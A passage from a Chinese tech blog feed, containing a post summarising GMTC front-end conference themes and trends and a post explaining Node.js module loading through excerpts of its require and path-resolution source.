        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4i6547tdj30hr0b3grp.jpg" alt="image-20201229101050657">  </p><h2 id="GMTC"><a href="#GMTC" class="headerlink" title="GMTC"></a>GMTC</h2><p><a href="https://www.huodongjia.com/tag/28439/" target="_blank" rel="noopener">GMTC</a>全球大<a href="https://www.huodongjia.com/tag/8374/" target="_blank" rel="noopener">前端</a>技术大会是由极客邦科技旗下InfoQ中国主办的技术盛会，关注前端、移动、AI应用等多个技术领域，促进全球技术交流，推动国内技术升级。GMTC为期4天，包括两天的会议和两天的培训课，主要面向各行业前端、移动开发、AI技术感兴趣的中高端技术人员，大会聚焦前沿技术及实践经验，旨在帮助参会者了解大前端&amp;移动开发领域的技术趋势与实践案例。</p><h2 id="GMTC技术演变"><a href="#GMTC技术演变" class="headerlink" title="GMTC技术演变"></a>GMTC技术演变</h2><h3 id="2016全球移动技术大会"><a href="#2016全球移动技术大会" class="headerlink" title="2016全球移动技术大会"></a>2016全球移动技术大会</h3><p>大会主题</p><ul><li>动态化</li><li>swift</li><li>新技术实践RN </li><li>客户端性能优化 </li><li>应用架构 </li><li>VR/AR开发 </li><li>架构演进 </li><li>移动解决⽅案 </li></ul><h3 id="2017全球移动技术大会-智能时代的大前端"><a href="#2017全球移动技术大会-智能时代的大前端" class="headerlink" title="2017全球移动技术大会(智能时代的大前端)"></a>2017全球移动技术大会(智能时代的大前端)</h3><p>大会主题</p><ul><li>动态化 </li><li>性能优化 </li><li>VR/ AR </li><li>移动AI </li><li>解决⽅案 </li><li>移动架构 </li><li>移动web优化 </li><li>web框架实践 </li><li>⼤前端 </li><li>⼯程化 </li><li>质量保证</li></ul><h3 id="2018全球-⼤前端-技术⼤会"><a href="#2018全球-⼤前端-技术⼤会" class="headerlink" title="2018全球==⼤前端==技术⼤会"></a>2018全球==⼤前端==技术⼤会</h3><p>大会主题</p><ul><li>客户端新技术专场 </li><li>性能优化与监控 </li><li>解决⽅案 </li><li>终端AI </li><li>PWA专场 </li><li>UI与动画 </li><li>web框架专场 </li><li>跨平台专场 </li><li>⼯程化 </li><li>Node专场 </li><li>编程语⾔</li></ul><h3 id="2019全球⼤前端技术⼤会"><a href="#2019全球⼤前端技术⼤会" class="headerlink" title="2019全球⼤前端技术⼤会"></a>2019全球⼤前端技术⼤会</h3><p>大会主题</p><ul><li>性能优化与监控 </li><li>UI与图形渲染 </li><li>质量保证 </li><li>移动AI </li><li>架构演进 </li><li>跨平台技术Flutter </li><li>编程语⾔ts </li><li>前端框架 </li><li>前端⼯程化 </li><li>Node实战 </li><li>未来移动技术 </li><li>小程序 </li><li>前端团队管理 </li></ul><h3 id="2020全球-前端-技术大会"><a href="#2020全球-前端-技术大会" class="headerlink" title="2020全球==前端==技术大会"></a>2020全球==前端==技术大会</h3><p>大会主题  </p><p><strong>Flutter 实战</strong></p><p>Flutter 作为革命性的跨终端解决方案，一经推出就获得了广泛关注。新的一年，Flutter 在原有的工程效率和体验侧有什么新的变化？在业务对用户增长和游戏化诉求强烈的今天，Flutter 带来的想象力是什么？Flutter 未来的机会和挑战是什么？</p><p><strong>小程序实战与优化</strong></p><p>随着各大平台小程序的快速放量，开发者遇到越来越多的平台适配问题。各平台小程序的性能优化方法也各不相同。本专场将邀请一线的技术专家为各位带来跨平台小程序框架实现原理，跨平台小程序实战中的一些挑战，以及小程序性能优化的实践案例等等。</p><p><strong>编程语言</strong></p><p>从编程语言方面看，在前端开发领域，JavaScript 一直是当之无愧的王者；在移动开发领域，Objective-C 和 Java 又分别统治着 iOS 和 Android 阵营。最近几年，很多新的语言凭借更现代的语言特性、更高的开发效率，以及背后大厂的支持，应用也越来越广泛。</p><p><strong>跨端框架演进</strong></p><p>Angular、Vue 和 React，前端框架从最初的仅限于 Web 的开发场景逐渐向多端研发开始演进。从最初 Angular 采用的“脏检查” UI 更新方式，到 Vue 3.0 基于 Proxy 的启发式 UI 更新策略。前端框架的底层技术随着标准的不断发展也在不断地进行着创新。</p><p><strong>大前端中台化演进</strong></p><p>伴随着 TOB 场景越来越多，传统的前后端分离的研发模式已经不再满足需求，微“前端”服务的“中台”的作用愈加明显。我们把业务、行业共同点提升到中台完成，成为“大中台、小前端”，能最大程度复用、解耦业务、满足业务敏捷扩展。</p><p><strong>前端安全生产</strong></p><p>随着前端专业技术的发展，前端研发在整个 Web 应用研发工程链路上扮演着越来越重要的角色，前端安全生产的责任也随之放大，在前端应用开发、发布、线上运行的不同阶段，如何让前端工程师产出的代码更加靠谱，不带着问题发布，线上发现前端故障后也能及时止血？</p><p><strong>端侧AI</strong></p><p>人工智能发展已进入“落地为王”阶段，端侧 AI 相比云侧 AI，具有低延时、保护数据隐私、节省云端计算资源等优势，现已成为端侧技术新热点，并且紧贴用户在 AR 特效、搜索推荐等有诸多创新应用。</p><p><strong>Node 实战</strong></p><p>随着大前端的发展，Node.js 也已经发布到 v13，其应用场景从脚手架、辅助前端开发（比如 SSR、PWA 等）的快速开发实践，到 API 中间层、代理层，甚至到后端开发都有非常成熟的经验。本专场将重点邀请一线专家给大家带来他们在各自领域的实战经验。</p><p><strong>大前端工程化</strong></p><p>大前端工程化是指移动端、前端在项目规模、工程复杂度、快速迭代等相同背景下，对一些共性问题的思考。工程化是与实践密不可分的，本专场我们通过分享业内一些经过实践检验的工程化方案，希望能够为大家提供借鉴和帮助。</p><p><strong>性能优化与监控</strong></p><p>性能优化能直接提升用户更快、更流畅的产品体验，在资源受限的移动设备上显得越发重要。通过全链路监控前端、后端、客户端整个通道，拆解用户到达场景下的性能瓶颈，优化整个关键耗时路径，提升产品服务稳定性和速度。</p><p><strong>Serverless 实战</strong></p><p>Serverless 即无服务器技术，是当今炙手可热的方向。因其降低开发成本、按需自动扩缩容、免运维等诸多优势，被越来越多的行业和公司用于更快的构建云上应用。如何让更多的研发团队和开发者，将 Serverless 与自身业务相结合，进行技术升级 ？</p><p><strong>前端前沿技术</strong></p><p>前端技术的发展趋势在最近十年里以惊人的速度向上攀升，而新技术的出现则使得前端从传统的 Web 平台逐渐向外扩展到更多领域。新前端技术的出现源于对业务场景所追求的高性能、高可用性以及高扩展性等多个方面。</p><p><strong>团队建设与管理</strong></p><p>中国互联网产业高速发展，在带动前端行业蓬勃发展的同时，也伴随着成千上万的前端工程师的管理问题。如何在业务达成过程中帮助前端工程师更快成长，如何挖掘工程师的价值考验着每一位前端团队管理者。</p><p><strong>大前端架构演进</strong></p><p>前端和移动端的场景越来越复杂，了解前端架构发展的路径，抽象出其背后的原理，找到变革的驱动力，掌握技术发展的趋势，是学习前端架构的有效途径。 本专场借助几个行业具体的实践案例，谈谈对目前大前端发展趋势和架构演进的理解和展望。</p><h3 id="GMTC的演变"><a href="#GMTC的演变" class="headerlink" title="GMTC的演变"></a>GMTC的演变</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4j1fnr7fj31cu0qiwjd.jpg" alt="image-20201229104057703">  </p><h2 id="大前端时代的焦点"><a href="#大前端时代的焦点" class="headerlink" title="大前端时代的焦点"></a>大前端时代的焦点</h2><p><strong>前端给终端⽤户提供什么?</strong>  </p><ul><li>通过不同端、端侧技术达到最佳的交互体验  </li></ul><p><strong>前端能⼲什么? 技术⼿段？</strong></p><ul><li>跨端、Node、BFF &amp; Serveless、可视化、IoT、AI等</li></ul><p><strong>前端需要什么 ⼯程设施？</strong>  </p><ul><li>不同场景下的开箱即⽤的⽅案</li><li>⼀站式开发体验</li></ul><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4jkhmx4hj31bq0eutb5.jpg" alt="image-20201229105916297">  </p><h2 id="我们关注什么？"><a href="#我们关注什么？" class="headerlink" title="我们关注什么？"></a>我们关注什么？</h2><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4jly1gjwj319s0dywhz.jpg" alt="image-20201229110040655"></p><h2 id="前端工程化体系"><a href="#前端工程化体系" class="headerlink" title="前端工程化体系"></a>前端工程化体系</h2><h3 id="基础工程设施"><a href="#基础工程设施" class="headerlink" title="基础工程设施"></a>基础工程设施</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4josbqcrj30wx0lpag6.jpg" alt="image-20201229110324346">  </p><h3 id="工程化工具链形态"><a href="#工程化工具链形态" class="headerlink" title="工程化工具链形态"></a>工程化工具链形态</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4k0jl07jj317k0u043c.jpg" alt="image-20201229111442068">  </p><h3 id="工程化-平台化时代"><a href="#工程化-平台化时代" class="headerlink" title="工程化-平台化时代"></a>工程化-平台化时代</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4k2v8ji6j316c0da403.jpg" alt="image-20201229111656747">  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4k3b7lkmj31gu0m2do8.jpg" alt="image-20201229111722227">  </p><h3 id="云-端时代"><a href="#云-端时代" class="headerlink" title="云+端时代"></a>云+端时代</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4k3w8lq2j31cw0tewl2.jpg" alt="image-20201229111755594">  </p><h2 id="nodejs应用"><a href="#nodejs应用" class="headerlink" title="nodejs应用"></a>nodejs应用</h2><h3 id="node应用场景演变"><a href="#node应用场景演变" class="headerlink" title="node应用场景演变"></a>node应用场景演变</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4p964yz6j318q0biq41.jpg" alt="image-20201229141559243">  </p><h3 id="工具时代"><a href="#工具时代" class="headerlink" title="工具时代"></a>工具时代</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4p9kzfj5j310c0hgq44.jpg" alt="image-20201229141623502">  </p><h3 id="web应用"><a href="#web应用" class="headerlink" title="web应用"></a>web应用</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4pa1z1mnj31bs0py0ul.jpg" alt="image-20201229141650223">  </p><h3 id="BFF应用"><a href="#BFF应用" class="headerlink" title="BFF应用"></a>BFF应用</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4pawf8f9j31260mmag9.jpg" alt="image-20201229141739640">  </p><p><strong>特点：多端应用、服务聚合</strong></p><h3 id="Serverless去服务器化"><a href="#Serverless去服务器化" class="headerlink" title="Serverless去服务器化"></a>Serverless去服务器化</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4prgx0esj31380twjuj.jpg" alt="image-20201229143334499">  </p><h3 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h3><p>越来越多⼈开始使⽤TypeScript  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4ptjrqswj31bk0quq82.jpg" alt="image-20201229143534841">  </p><h3 id="node趋势"><a href="#node趋势" class="headerlink" title="node趋势"></a>node趋势</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4puw55ysj317203mmxh.jpg" alt="image-20201229143651433">  </p><h2 id="跨平台技术"><a href="#跨平台技术" class="headerlink" title="跨平台技术"></a>跨平台技术</h2><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4re6zch4j31a80u0jvh.jpg" alt="image-20201229153000885">  </p><h3 id="RN与Flutter原理对比"><a href="#RN与Flutter原理对比" class="headerlink" title="RN与Flutter原理对比"></a>RN与Flutter原理对比</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4rj93y6fj31420u0tmj.jpg" alt="image-20201229153452524">  </p><h3 id="Flutter-For-Web"><a href="#Flutter-For-Web" class="headerlink" title="Flutter For Web"></a>Flutter For Web</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4rk18mcaj31f40ton4z.jpg" alt="image-20201229153538184">  </p><h3 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4rkp2t8jj317b0u0tf7.jpg" alt="image-20201229153615862">  </p><h3 id="小程序架构选型"><a href="#小程序架构选型" class="headerlink" title="小程序架构选型"></a>小程序架构选型</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4rlkvhuej31bw0m6dql.jpg" alt="image-20201229153707102">  </p><p><strong>转换原理：语法树的映射解析 （⽂件格式、命名规则、属性和组件名替换，api的适配等）</strong></p><h3 id="小程序性能优化"><a href="#小程序性能优化" class="headerlink" title="小程序性能优化"></a>小程序性能优化</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4rvrk3mvj31680tg4a4.jpg" alt="image-20201229154654670"> </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4rwi95uxj31dd0u0th8.jpg" alt="image-20201229154737044">  </p><h2 id="性能优化与监控"><a href="#性能优化与监控" class="headerlink" title="性能优化与监控"></a>性能优化与监控</h2><h3 id="关键因素"><a href="#关键因素" class="headerlink" title="关键因素"></a>关键因素</h3><ul><li>前端⼈员深⼊理解浏览器，webview 渲染机制</li><li>客户端视⻆缓存，不要局限单端视⻆</li><li>性能指标监控</li></ul><h3 id="我们能做什么"><a href="#我们能做什么" class="headerlink" title="我们能做什么"></a>我们能做什么</h3><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm4vb4czvsj31610u0aeq.jpg" alt="image-20201229174523655">  </p><h3 id="大佬的前端监控的实现"><a href="#大佬的前端监控的实现" class="headerlink" title="大佬的前端监控的实现"></a>大佬的前端监控的实现</h3><p><a href="https://www.sohu.com/a/238991646_465223" target="_blank" rel="noopener">传送门</a></p><h2 id="大前端人才需求"><a href="#大前端人才需求" class="headerlink" title="大前端人才需求"></a>大前端人才需求</h2><p>互联网世界离不开前端开发，像淘宝、阿里巴巴、支付宝、腾讯、京东、新浪微博等等大型的基于互联网的企业与产品，都需要优秀的前端高级开发人才。</p><p>不仅仅是互联网企业，随着O2O模式的越来越普及，传统企业越来越互联网化、云端化，前端开发人才需求越来越多，人才缺口高达上百万。</p><p>随着5G落地，云计算、大数据和人工智能领域都赋予大前端开发更广阔的空间，跟上这个时代，抓住人工智能、大数据的风口，来学习前端开发，在这里遇见更优秀的自己</p>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flutter </tag>
            
            <tag> React </tag>
            
            <tag> TypeScrip </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于源码剖析nodejs模块系统</title>
      <link href="2020/12/25/%E5%9F%BA%E4%BA%8E%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90nodejs%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F/"/>
      <url>2020/12/25/%E5%9F%BA%E4%BA%8E%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90nodejs%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="nodejs模块系统"><a href="#nodejs模块系统" class="headerlink" title="nodejs模块系统"></a>nodejs模块系统</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>为了让Node.js的文件可以相互调用，Node.js提供了一个简单的模块系统。 </p><p>模块是Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之， </p><p>一个 Node.js 文件就是一个模块，这个文件可能是JavaScript 代码、JSON 或者编译过的C/C++ 扩展。</p><h3 id="nodejs模块分类"><a href="#nodejs模块分类" class="headerlink" title="nodejs模块分类"></a>nodejs模块分类</h3><ul><li>原生模块（核心模块）：fs、http、net等<br>在Node进程启动时，部分核心模块就被直接加载进内存中，这部分核心 模块引入时，文件定位和编译执行个步骤可以省略掉，并且在路径分析 中优先判断，所以它的加载速度是最快的。  </li><li>文件模块：用户编写的模块<br>文件模块是运行时动态加载，需要完整的路径分析、文件定位、编译执行 过程，速度比核心模块慢。</li><li>第三方模块：art-template、通过npm下载的</li></ul><h3 id="模块系统关键字"><a href="#模块系统关键字" class="headerlink" title="模块系统关键字"></a>模块系统关键字</h3><ul><li>require</li><li>module.exports/exports</li></ul><p>Node.js中没有全局作用域，只有模块作用域   </p><p>​                                    ——外部访问不到内部，内部访问不到外部</p><h2 id="node模块require引入分析"><a href="#node模块require引入分析" class="headerlink" title="node模块require引入分析"></a>node模块require引入分析</h2><p>模块引⼊三部曲：</p><ul><li>路径分析</li><li>⽂件定位</li><li>编译执⾏</li></ul><h3 id="引入规则"><a href="#引入规则" class="headerlink" title="引入规则"></a>引入规则</h3><blockquote><p>var <strong>自定义变量名称</strong> = require<strong>（</strong>“<strong>模块</strong>”<strong>）</strong></p></blockquote><p>1、加载文件模块，并执行里面的代码；   </p><p>2、拿到被加载的文件模块导出的模块对象。  </p><h4 id="系统模块引入"><a href="#系统模块引入" class="headerlink" title="系统模块引入"></a>系统模块引入</h4><blockquote><p>var net = require(“net”);  </p><p>var fs = require(“fs”);</p></blockquote><h4 id="文件模块引入"><a href="#文件模块引入" class="headerlink" title="文件模块引入"></a>文件模块引入</h4><blockquote><p>require(‘/文件名’)；//绝对路径 </p><p>require(‘./文件名’)；//相对路径 </p><p>require(‘../文件名’)</p></blockquote><p>如果直接引入会怎样呢？var test = require(“test”);</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm06ejaywnj30xi07u75h.jpg" alt="image-20201225162128528">  </p><h4 id="引入规则-1"><a href="#引入规则-1" class="headerlink" title="引入规则"></a>引入规则</h4><ul><li>如果有“./”从当前目录查找</li><li>如果没有“./”，先从系统模块，再从node_modules下查找</li></ul><h3 id="路径分析-amp-文件定位"><a href="#路径分析-amp-文件定位" class="headerlink" title="路径分析&amp;文件定位"></a>路径分析&amp;文件定位</h3><p>模块标识符分析：对于不同的标识符，模块的查找和定位不同。 </p><ul><li>核心模块， 如http、fs、path等 </li><li>“.”或“..”开始的相对路径文件模块 </li><li>以“/”开始的绝对路径文件模块 </li><li>非路径形式的文件模块，如che-ui模块 </li></ul><p>require()方法会将路径解析为真 实路径，并以真实路径进行加 载编译   </p><p>文件定位：   </p><ul><li>文件扩展名分析   </li><li>目录分析和包  </li></ul><p>代码追踪栈：</p><p>Module.prototype.require –&gt; Module.<em>load –&gt; Module.resolveFilename –&gt;</em></p><p><em>Module.</em>resolveLookupPaths –&gt; Module._fifindPath –&gt; fifileName(⽂件绝对路径)</p><h4 id="1、Module-prototype-require-require入口"><a href="#1、Module-prototype-require-require入口" class="headerlink" title="1、Module.prototype.require require入口"></a>1、Module.prototype.require require入口</h4><p>通过给定的path加载⼀个模块，并返回该模块的exports属性。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> assert <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ok<span class="token punctuation">;</span><span class="token operator">...</span><span class="token comment" spellcheck="true">// Loads a module at the given file path. Returns that module's 'exports'</span>propertyModule<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>require <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">assert</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">"missing path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//path不能为空</span>  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> path <span class="token operator">===</span> <span class="token string">"string"</span><span class="token punctuation">,</span> <span class="token string">"path must be a string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//path必须是字</span>  符串类型  <span class="token keyword">return</span> Module<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//加载模块并返回exports</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>assert</strong></p><p><a href="https://www.cnblogs.com/newh5/p/6579894.html" target="_blank" rel="noopener">assert</a>是Node.js中的断⾔模块： 提供简单的断⾔测试功能，主要⽤于内部使⽤，也可以</p><p>require(‘assert’) 后在外部进⾏使⽤。  </p><p>模块⽅法：  </p><ul><li>assert(value[,message]) == assert.ok(value[,message])</li><li>如果value的值为true，那么什么也不会发⽣；如果value为false，将抛出⼀个信息为message的错误。</li></ul><p>实例：  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glzxm8wbk5j310u0u01h3.jpg" alt="image-20201225111727573">  </p><h4 id="2、加载⽂件⽅法Module-load"><a href="#2、加载⽂件⽅法Module-load" class="headerlink" title="2、加载⽂件⽅法Module._load"></a><strong>2</strong>、加载⽂件⽅法<strong>Module._load</strong></h4><p>调⽤Module._resolveFilename获取⽂件绝对路径，并且根据该绝对路径添加缓存以及编译模块。</p><pre class="line-numbers language-js"><code class="language-js">Module<span class="token punctuation">.</span>_load <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> parent<span class="token punctuation">,</span> isMain<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//...</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">resolveFilename</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//路径解析，绝对路径</span>  <span class="token comment" spellcheck="true">//...</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、解析路径⽅法-Module-resolveFilename"><a href="#3、解析路径⽅法-Module-resolveFilename" class="headerlink" title="3、解析路径⽅法 Module._resolveFilename"></a><strong>3</strong>、解析路径⽅法 <strong>Module._resolveFilename</strong></h4><p>获取⽂件绝对路径。</p><pre class="line-numbers language-js"><code class="language-js">Module<span class="token punctuation">.</span>_resolveFilename <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//是原⽣模块并且不是原⽣内部模块则直接返回</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>NativeModule<span class="token punctuation">.</span><span class="token function">nonInternalExists</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> request<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//计算所有可能的路径</span>  <span class="token keyword">var</span> resolvedModule <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">_resolveLookupPaths</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> id <span class="token operator">=</span> resolvedModule<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> paths <span class="token operator">=</span> resolvedModule<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//计算⽂件的绝对路径</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">_findPath</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> paths<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Cannot find module '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>request<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">'`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    err<span class="token punctuation">.</span>code <span class="token operator">=</span> <span class="token string">"MODULE_NOT_FOUND"</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> err<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//返回⽂件绝对路径</span>  <span class="token keyword">return</span> filename<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>NativeModule.nonInternalExists</strong></p><p>nonInternalExists是Node.js原⽣模块提供的⽅法，⽤于判断：是原⽣模块并且不是原⽣内部模块。  </p><p>实现⽅法⾃⾏欣赏：</p><pre class="line-numbers language-js"><code class="language-js">NativeModule<span class="token punctuation">.</span>nonInternalExists <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> NativeModule<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>NativeModule<span class="token punctuation">.</span><span class="token function">isInternal</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>NativeModule<span class="token punctuation">.</span>isInternal <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> id<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'internal/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>node/lib/module.js ⽂件开头引⼊的两个原⽣内部模块 const internalModule =require(‘internal/module’); //internal/module 即是路径名也是id const internalUtil =require(‘internal/util’);</p></blockquote><p>也就是说在我们⾃⼰的代码⾥⾯是请求不到Node.js源码⾥⾯<code>lib/internal/*.js</code> 这些⽂件的，⽐如 <code>require(&quot;internal/module&quot;)</code>运⾏时会报错 <code>Error: Cannot find module&#39;internal/module&#39;</code>。  </p><p>特例 <code>require(&quot;internal/repl&quot;)</code>可以执⾏，具体什么应⽤场景，请⾃⾏查找。  </p><p>写个测试⽂件，在⾥⾯打印 <code>process.moduleLoadList</code>,可以查看已经加载的原⽣模块。</p><h4 id="4、Module-resolveLookupPaths"><a href="#4、Module-resolveLookupPaths" class="headerlink" title="4、Module._resolveLookupPaths"></a><strong>4</strong>、<strong>Module._resolveLookupPaths</strong></h4><p>计算所有可能的路径，对于核⼼模块、相对路径、绝对路径、⾃定义模块返回不同的数组。实现代码相对较复杂不做分析，只看执⾏结果  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glzy9d5nyxj31be0tih0w.jpg" alt="image-20201225113943994"></p><h4 id="5、Module-fifindPath"><a href="#5、Module-fifindPath" class="headerlink" title="5、Module._fifindPath"></a><strong>5</strong>、<strong>Module._fifindPath</strong></h4><p>根据⽂件可能路径定位⽂件绝对路径，包括后缀的补全(.js , .json, .node)</p><pre class="line-numbers language-js"><code class="language-js">Module<span class="token punctuation">.</span>_findPath <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> paths<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//绝对路径，将 paths 清空</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        paths <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//第⼀步：如果当前路径已在缓存中，直接返回缓存</span>    <span class="token keyword">var</span> cacheKey <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>request<span class="token punctuation">:</span> request<span class="token punctuation">,</span> paths<span class="token punctuation">:</span> paths<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Module<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>cacheKey<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Module<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>cacheKey<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//获取后缀名：.js, .json, .node</span>    <span class="token keyword">const</span> exts <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Module<span class="token punctuation">.</span>_extensions<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//模块路径是否以/结尾，如果路径以/结尾，那么就是⽂件夹</span>    <span class="token keyword">const</span> trailingSlash <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 第⼆步，依次遍历所有路径</span>    